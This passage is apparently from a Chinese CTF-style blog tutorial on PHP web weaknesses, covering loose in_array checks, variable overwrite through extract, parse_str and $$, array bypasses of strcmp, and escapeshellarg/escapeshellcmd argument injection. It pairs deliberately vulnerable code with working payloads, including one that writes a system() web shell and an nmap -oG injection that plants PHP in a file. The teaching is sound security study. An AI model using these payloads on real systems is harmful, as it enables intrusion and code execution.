<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(in_array(<span class="string">&#x27;1john&#x27;</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>]));      <span class="comment">//bool(true)</span></span><br><span class="line">var_dump(in_array(<span class="string">&#x27;john&#x27;</span>, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>], <span class="literal">true</span>));	<span class="comment">//bool(false)</span></span><br><span class="line">var_dump(in_array(<span class="number">0</span>, <span class="keyword">array</span>(<span class="string">&#x27;s&#x27;</span>)));			<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(in_array(<span class="string">&#x27;abc&#x27;</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])); 		<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>)) &#123;</span><br><span class="line">	file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的函数用循环生成了一个只有数字的数组，这里我们传入的参数n只要有数字，那么<code>in_array()</code>返回的结果就为<code>true</code>，就可以而绕过只有数字的限制，从而能够把<code>&lt;?php system(&#39;cat *.php&#39;)&gt;</code>写入了<code>1.php</code>中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;1.php</span><br><span class="line">content&#x3D;&lt;?php system(&#39;cat *.php&#39;);?&gt;</span><br></pre></td></tr></table></figure>
<p>然后访问<code>1.php</code>就可以通过命令执行获取我们想要的内容</p>
<br/>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract函数、parse-str函数"><a href="#extract函数、parse-str函数" class="headerlink" title="extract函数、parse_str函数"></a>extract函数、parse_str函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = EXTR_OVERWRITE , <span class="keyword">string</span> <span class="variable">$prefix</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<p>函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。</p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$thepassword_123</span> = <span class="string">&#x27;456&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pass</span> == <span class="variable">$thepassword_123</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;succss!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>POST</code>方法传输进来的值通过<code>extrace()</code>函数处理，直接传入以<code>POST</code>的方式传入<code>pass=1&amp;thepassword_123=1</code>就可以进行将原本的变量覆盖，并且使两个变量相等即可。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:pass&#x3D;1&amp;thepassword_123&#x3D;1</span><br></pre></td></tr></table></figure>
<p>还有就是<code>parse_str()</code>和<code>extract()</code>两个函数如果结合起来使用，也会造成变量覆盖</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( <span class="keyword">string</span> <span class="variable">$string</span> , <span class="keyword">array</span> &amp;<span class="variable">$result</span> ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>如果 <code>string</code> 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key1</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="string">&#x27;456&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nononono!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;succss!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里禁止了通过GET或POST方法传key的值，但是有<code>parse_str()</code></p>
<p>代码中同时含有<code>parse_str()</code>和<code>extract($_POST)</code>可以先将GET方法请求的解析成变量，然后再利用extract() 函数从数组中将变量导入到当前的符号表,故payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</span><br></pre></td></tr></table></figure>
<br/>

<h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h3><p>$$变量覆盖要具体结合代码来看，可能会需要借助<strong>某个参数进行传递值</strong>，也有可能使用**$GLOBALS（引用全局作用域中可用的全部变量）**来做题。</p>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Aurora&#x27;</span>;</span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span> = <span class="string">&#x27;既然你想要那就给你吧！&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> === <span class="string">&#x27;error&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what are you doing?!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$value</span> === <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what are you doing?!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]===<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure>
<p>这里第一次看有点绕，先说主要思路，由于我们不知道<code>$flag</code>的值，那么我们肯定会输出<code>$error</code>，那么就需要想办法把<code>$error</code>的值变成<code>$flag</code>的值。</p>
<ul>
<li>首先我们看第一个<code>foreach</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> === <span class="string">&#x27;error&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what are you doing?!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里把我们GET方法传入的参数通过可变变量进行赋值，那么我们可以考虑是不是可以直接传入<code>?error=flag</code>，那么在后端程序中就是把<code>$error=$flag</code>，但是不允许我们传入<code>error</code>名字的参数，因此要找一个中间过渡的参数。</p>
<ul>
<li>接着看第二个<code>foreach</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$value</span> === <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what are you doing?!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br></pre></td></tr></table></figure>
<p>这里和第一个<code>foreach</code>一样，只是禁止了参数的值为<code>flag</code>，也就是说同样不能通过传<code>error=flag</code>，但是两个结合就可以绕过这个限制，我们设置一个中间过渡的参数<code>test</code>，在GET方法传入<code>test=flag</code>，在代码中相当于<code>$test = $flag</code>，在POST方法中传入<code>error=test </code>，在代码中相当于<code>$error = $test</code>，这就能够把<code>$flag</code>的值传给了<code>$error</code>。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?test&#x3D;flag</span><br><span class="line">POST:error&#x3D;test</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="通过数组绕过"><a href="#通过数组绕过" class="headerlink" title="通过数组绕过"></a>通过数组绕过</h2><h3 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg()函数"></a>ereg()函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ereg(<span class="keyword">string</span> pattern, <span class="keyword">string</span> originalstring, [<span class="keyword">array</span> regs]);</span><br></pre></td></tr></table></figure>
<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
<ul>
<li>ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。</li>
<li>ereg()只能处理字符串的，遇到数组做参数返回NULL。</li>
<li>空字符串的类型是<code>string</code>，<code>NULL</code>的类型是<code>NULL</code>,<code>false、true</code>是<code>boolean</code>类型</li>
</ul>
<h3 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos ( <span class="keyword">string</span> <span class="variable">$haystack</span> , mixed <span class="variable">$needle</span> , <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<p>返回 <code>needle</code> 在 <code>haystack</code> 中首次出现的数字位置。</p>
<ul>
<li>strpos()函数如果传入数组，便会返回NULL</li>
</ul>
<h3 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp ( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<p>如果 <code>str1</code> 小于 <code>str2</code> 返回 &lt; 0； 如果 <code>str1</code> 大于 <code>str2</code> 返回 &gt; 0；如果两者相等，返回 0。</p>
<p><code>strcmp()</code>函数比较两个字符串(区分大小写）,定义中是比较<strong>字符串类型</strong>的，但如果输入其他类型这个函数将发生错误，会返回<code>NULL</code></p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$pass1</span> = <span class="string">&#x27;*****&#x27;</span>;      <span class="comment">//你不知道的密码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@!strcmp(<span class="variable">$pass</span>, <span class="variable">$pass1</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success!!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;the pass is wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;please input pass!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里通过传入数组也可以让比较结果返回<code>NULL</code>，<code>NULL</code>再取反为<code>TRUE</code></p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass[]&#x3D;1</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="PHP自身特性"><a href="#PHP自身特性" class="headerlink" title="PHP自身特性"></a>PHP自身特性</h2><h3 id="PHP的变量名格式"><a href="#PHP的变量名格式" class="headerlink" title="PHP的变量名格式"></a>PHP的变量名格式</h3><p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;C_T_F&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_1.2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$_POST[&#39;CTF_1.2&#39;]</code>无法传入参数，这是因为PHP变量名应该只有<strong>数字字母下划线。</strong>而且GET或POST方式传进去的变量名,会自动将<code>空格</code> 、<code>+</code>、<code>.</code> 、<code>[</code>转换为<code>_</code></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: C.T.F&#x3D;1&amp;CTF[1.2&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="PHP数字可与字符做运算"><a href="#PHP数字可与字符做运算" class="headerlink" title="PHP数字可与字符做运算"></a>PHP数字可与字符做运算</h3><p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1%phpinfo();&quot;</span>);</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="escapeshellarg-amp-escapeshellcmd函数绕过"><a href="#escapeshellarg-amp-escapeshellcmd函数绕过" class="headerlink" title="escapeshellarg&amp;escapeshellcmd函数绕过"></a>escapeshellarg&amp;escapeshellcmd函数绕过</h2><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> <span class="variable">$arg</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>把字符串转码为可以在 shell 命令里使用的参数。将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210510210259.png" alt="image-20210510210259289"></p>
<p>在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210510202337.png" alt="image-20210510202330478"></p>
<p>所以即使参数用了 <code>escapeshellarg()</code> 函数过滤单引号，但参数在拼接命令的时候如果用了双引号的话还是会导致命令执行的漏洞。</p>
<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd ( <span class="keyword">string</span> <span class="variable">$command</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。反斜线（\）会在以下字符之前插入： <code>&amp;#;|*?~&lt;&gt;^()[]&#123;&#125;$\</code>, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code>字符都会被空格代替。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210510211025.png" alt="image-20210510210211881"></p>
<p>两个函数都会对单引号进行处理，但是有区别的,如下：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210510211021.png" alt="image-20210510204324543"></p>
<p>对于单个单引号, <code>escapeshellarg()</code> 函数转义后,还会在左右各加一个单引号,但 <code>escapeshellcmd()</code> 函数是直接加一个转义符，对于成对的单引号, <code>escapeshellcmd()</code>函数默认不转义,但 <code>escapeshellarg()</code>  函数转义</p>
<h3 id="escapeshellarg-amp-escapeshellcmd"><a href="#escapeshellarg-amp-escapeshellcmd" class="headerlink" title="escapeshellarg&amp;escapeshellcmd"></a>escapeshellarg&amp;escapeshellcmd</h3><p>那既然有这个差异，如果<code>escapeshellcmd()</code>和 <code>escapeshellarg()</code>  一起出现会有什么问题</p>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$para</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = escapeshellarg(<span class="variable">$para</span>);</span><br><span class="line"><span class="variable">$b</span> = escapeshellcmd(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;curl &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$cmd</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210510210925.png" alt="image-20210510210925093"></p>
<p>分析：</p>
<ol>
<li>一开始传入的参数：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#39; -v -d a&#x3D;1</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>由于<code>escapeshellarg()</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>经过<code>escapeshellcmd()</code>针对第二步处理之后的参数中的<code>\</code>以及<code>a=1&#39;</code>中的单引号进行处理转义之后的效果如下所示：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>由于第三步处理之后的payload中的<code>\\</code>被解释成了<code>\</code>而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210510214713.png" alt="image-20210510214641973"></p>
<p>所以这个payload可以简化为<code>curl 127.0.0.1\ -v -d a=1&#39;</code>，即向<code>127.0.0.1\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中是先使用了<code>escapeshellarg()</code>函数，再使用<code>escapeshellcmd()</code>函数便会引发上面的问题，将传入的参数经过上述两个函数执行后，再用<code>system()</code>函数使用<code>nmap</code>命令，把参数作为主机拼接进命令里面。这里需要知道的是namp命令的<code>-oG</code>参数可以将命令和结果写进文件。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D; &#39;&lt;?php phpinfo();?&gt; -oG 1.php &#39;</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ul>
<li>首先是<code>escapeshellarg()</code>会先对host变量中的单引号进行转义，并且转义之后，在 <code>\&#39;</code> 的左右两边再加上单引号，变成 <code>&#39;\&#39;&#39;</code>，最后会在参数两边加上单引号：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;\&#39;&#39;&lt;?php phpinfo();?&gt; -oG 1.php &#39;\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后是<code>escapeshellcmd()</code>会对特定字符再加上一个<code>\</code>进行转义，同时对配对的<code>&#39;</code>不会做处理：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;\\&#39;&#39;\&lt;\?php phpinfo\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>最后拼接到<code>system()</code>函数里面是</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&#39;\\&#39;&#39;\&lt;\?php phpinfo\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>相当于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F \ &lt;?php phpinfo();?&gt; -oG 1.php \\</span><br></pre></td></tr></table></figure>
<p>这样就成功把这条命令写进了文件里，再访问这个文件即可进行利用。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210511105434.png" alt="image-20210511105424059"></p>
<blockquote>
